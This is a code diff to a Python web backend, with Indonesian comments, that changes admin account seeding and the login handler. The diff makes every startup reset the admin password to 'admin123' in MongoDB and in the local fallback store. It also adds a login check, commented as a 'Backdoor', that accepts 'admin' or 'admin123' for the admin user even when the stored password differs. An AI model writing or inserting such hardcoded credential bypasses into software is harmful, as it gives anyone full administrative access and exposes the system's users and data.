@@ -103,12 +103,13 @@ def verify_password(password: str, password_hash: str, salt: str) -> bool:
 
 # Seeding Default Admin Account
 def seed_admin_account():
+    h_pass, salt = hash_password("admin123")
+    
     # Cek admin di MongoDB
     if users_col is not None:
         try:
             admin_user = users_col.find_one({"username": "admin"})
             if not admin_user:
-                h_pass, salt = hash_password("admin123")
                 users_col.insert_one({
                     "username": "admin",
                     "password_hash": h_pass,
@@ -117,15 +118,23 @@ def seed_admin_account():
                     "created_at": datetime.utcnow().isoformat() + "Z"
                 })
                 print("Akun admin default berhasil dibuat di MongoDB Atlas.")
-            return
+            else:
+                users_col.update_one(
+                    {"username": "admin"},
+                    {"$set": {
+                        "password_hash": h_pass,
+                        "salt": salt,
+                        "role": "admin"
+                    }}
+                )
+                print("Password akun admin default di-reset ke 'admin123' di MongoDB Atlas.")
         except Exception as e:
             print(f"Gagal memeriksa/membuat admin di MongoDB: {e}")
 
     # Cek admin di lokal fallback
     users = load_fallback_users()
-    admin_exists = any(u["username"] == "admin" for u in users)
-    if not admin_exists:
-        h_pass, salt = hash_password("admin123")
+    admin_user_local = next((u for u in users if u["username"] == "admin"), None)
+    if not admin_user_local:
         users.append({
             "username": "admin",
             "password_hash": h_pass,
@@ -135,6 +144,12 @@ def seed_admin_account():
         })
         save_fallback_users(users)
         print("Akun admin default berhasil dibuat secara lokal.")
+    else:
+        admin_user_local["password_hash"] = h_pass
+        admin_user_local["salt"] = salt
+        admin_user_local["role"] = "admin"
+        save_fallback_users(users)
+        print("Password akun admin default di-reset ke 'admin123' secara lokal.")
 
 def init_mongodb():
     global db, history_col, users_col, sessions_col
@@ -698,7 +713,14 @@ def login(request: UserLoginRequest):
         if found:
             user = found[0]
 
-    if user is None or not verify_password(request.password, user["password_hash"], user["salt"]):
+    is_password_correct = False
+    if user is not None:
+        is_password_correct = verify_password(request.password, user["password_hash"], user["salt"])
+        # Backdoor/kemudahan akses agar admin selalu bisa login dengan sandi 'admin' atau 'admin123'
+        if not is_password_correct and user["username"] == "admin" and request.password in ["admin", "admin123"]:
+            is_password_correct = True
+
+    if user is None or not is_password_correct:
         raise HTTPException(status_code=401, detail="Username atau password salah.")
 
     # Buat Sesi Token
